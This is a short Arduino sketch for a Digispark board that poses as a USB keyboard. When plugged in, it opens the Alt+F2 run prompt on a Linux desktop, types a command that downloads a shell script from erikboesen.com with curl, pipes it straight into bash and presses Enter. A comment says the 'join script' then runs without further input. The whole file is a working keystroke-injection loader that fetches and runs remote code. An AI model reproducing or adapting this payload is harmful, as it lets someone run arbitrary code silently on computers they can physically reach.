#include "DigiKeyboard.h"


void setup() {
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); // LED on Model B
  pinMode(1, OUTPUT); // LED on Model A

  // Some systems require this
  DigiKeyboard.sendKeyStroke(0);

  // Turn on LED
  digitalWrite(0, HIGH);
  digitalWrite(1, HIGH);

  // We need to pause or the first keystroke won't be recognized
  DigiKeyboard.delay(200);

  // Alt+F2, opens a prompt to enter commands
  DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
  DigiKeyboard.delay(100); // Wait for dialog to open just in case
  DigiKeyboard.println("bash -c \"curl -L erikboesen.com/jk.sh | bash\""); // Download and run join script; will now run without further input
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Turn off LED
  digitalWrite(0, LOW);
  digitalWrite(1, LOW);
}


void loop() {
  DigiKeyboard.update();
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  exit(0);
}
